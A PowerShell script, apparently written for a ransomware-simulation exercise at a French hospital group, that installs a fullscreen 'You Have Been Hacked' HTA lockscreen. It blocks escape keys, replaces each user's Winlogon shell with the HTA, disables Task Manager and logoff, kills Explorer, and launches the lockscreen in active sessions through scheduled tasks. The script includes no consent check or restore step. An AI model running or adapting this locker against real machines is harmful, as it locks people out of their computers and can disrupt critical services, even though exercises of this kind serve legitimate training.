#==============================================================================
# LOCKOUT_PC.ps1 — Cyber Exercise: Fullscreen "You Have Been Hacked"
#
# DESIGN:
#   - Writes ONLY to user registry hives (HKEY_USERS\<SID>), NOT to HKLM
#   - This avoids messing with the system shell (which may not be standard)
#   - Works when run as SYSTEM via scheduled task on Windows 10
#   - Recovery is simple: fix the user hive + delete files
#==============================================================================

# --- Ensure admin ---
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] Must run as Administrator." -ForegroundColor Red
    exit 1
}

$ExerciseDir = "C:\CyberExercise"
$HtaPath = "$ExerciseDir\lockscreen.hta"

if (!(Test-Path $ExerciseDir)) { New-Item -ItemType Directory -Path $ExerciseDir -Force | Out-Null }

# =============================================
# STEP 1: Create HTA lockscreen
# =============================================
$htaContent = @'
<html>
<head>
<title>COMPROMISED</title>
<HTA:APPLICATION
  ID="Lockscreen"
  APPLICATIONNAME="Lockscreen"
  BORDER="none"
  BORDERSTYLE="none"
  CAPTION="no"
  CONTEXTMENU="no"
  INNERBORDER="no"
  MAXIMIZEBUTTON="no"
  MINIMIZEBUTTON="no"
  NAVIGABLE="no"
  SCROLL="no"
  SELECTION="no"
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  SYSMENU="no"
  WINDOWSTATE="maximize"
/>
<style>
  * { margin: 0; padding: 0; }
  body {
    background: #0a0a0a;
    color: #ff0000;
    font-family: Courier New, monospace;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    overflow: hidden;
    cursor: none;
  }
  .skull { font-size: 80px; margin-bottom: 20px; }
  h1 {
    font-size: 64px;
    text-transform: uppercase;
    letter-spacing: 8px;
    text-shadow: 0 0 20px #ff0000, 0 0 40px #cc0000;
    margin-bottom: 30px;
  }
  .sub { font-size: 24px; color: #cc0000; letter-spacing: 5px; margin-bottom: 10px; }
  .info { font-size: 16px; color: #555; margin-top: 40px; }
</style>
<script language="VBScript">
  Sub document_onkeydown
    Set ev = window.event
    If ev.altKey And ev.keyCode = 115 Then ev.returnValue = False
    If ev.ctrlKey And ev.keyCode = 87 Then ev.returnValue = False
    If ev.ctrlKey And ev.keyCode = 27 Then ev.returnValue = False
    If ev.altKey And ev.keyCode = 9 Then ev.returnValue = False
    If ev.keyCode = 122 Then ev.returnValue = False
    If ev.keyCode = 91 Or ev.keyCode = 92 Then ev.returnValue = False
  End Sub
  Sub window_onload
    window.moveTo 0, 0
    window.resizeTo screen.width, screen.height
    setInterval "self.focus", 500
  End Sub
</script>
</head>
<body ondragstart="return false" onselectstart="return false" oncontextmenu="return false">
  <div class="skull">&#9760;</div>
  <h1>You Have Been Hacked</h1>
  <div class="sub">ALL YOUR SYSTEMS ARE COMPROMISED</div>
  <div class="sub">ALL YOUR DATA HAS BEEN ENCRYPTED</div>
  <div class="info">[ CYBER EXERCISE - HOSPICES CIVILS DE LYON ]</div>
</body>
</html>
'@

Set-Content -Path $HtaPath -Value $htaContent -Encoding ASCII
Write-Host "[+] HTA lockscreen created at $HtaPath" -ForegroundColor Yellow

# =============================================
# STEP 2: Modify ALL loaded user hives (via HKEY_USERS\<SID>)
# This works from SYSTEM context because HKEY_USERS contains all loaded profiles
# =============================================

$userProfiles = Get-ChildItem "Registry::HKEY_USERS" | Where-Object {
    $_.Name -match 'S-1-5-21-' -and $_.Name -notmatch '_Classes$'
}

foreach ($profile in $userProfiles) {
    $sid = $profile.PSChildName

    # Replace Shell → HTA lockscreen
    $winlogon = "Registry::HKEY_USERS\$sid\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
    if (!(Test-Path $winlogon)) { New-Item -Path $winlogon -Force | Out-Null }
    Set-ItemProperty -Path $winlogon -Name "Shell" -Value "mshta.exe $HtaPath" -Type String

    # Disable Task Manager
    $policies = "Registry::HKEY_USERS\$sid\Software\Microsoft\Windows\CurrentVersion\Policies\System"
    if (!(Test-Path $policies)) { New-Item -Path $policies -Force | Out-Null }
    Set-ItemProperty -Path $policies -Name "DisableTaskMgr" -Value 1 -Type DWord

    # Disable logoff and start menu changes
    $explorer = "Registry::HKEY_USERS\$sid\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    if (!(Test-Path $explorer)) { New-Item -Path $explorer -Force | Out-Null }
    Set-ItemProperty -Path $explorer -Name "NoLogoff" -Value 1 -Type DWord
    Set-ItemProperty -Path $explorer -Name "NoChangeStartMenu" -Value 1 -Type DWord

    Write-Host "[+] User $sid — shell replaced, Task Manager disabled" -ForegroundColor Yellow
}

# =============================================
# STEP 3: Kill Explorer and launch HTA in user sessions
# =============================================

Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
Write-Host "[+] Explorer killed" -ForegroundColor Yellow

# Launch HTA in active user sessions
$queryResult = quser 2>$null
if ($queryResult) {
    $queryResult | Select-Object -Skip 1 | ForEach-Object {
        if ($_ -match '(\d+)\s+(Active|Actif)') {
            $sessionId = $Matches[1]
            $tempTask = "CyberEx_HTA_$sessionId"
            schtasks /create /tn $tempTask /tr "mshta.exe $HtaPath" /sc once /st 00:00 /f /ru "SYSTEM" 2>$null | Out-Null
            schtasks /run /tn $tempTask 2>$null | Out-Null
            Start-Sleep -Milliseconds 500
            schtasks /delete /tn $tempTask /f 2>$null | Out-Null
            Write-Host "[+] HTA launched in session $sessionId" -ForegroundColor Yellow
        }
    }
} else {
    Start-Process "mshta.exe" -ArgumentList $HtaPath
    Write-Host "[+] HTA launched (direct)" -ForegroundColor Yellow
}

Write-Host "`n[*] === LOCKOUT COMPLETE ===" -ForegroundColor Red
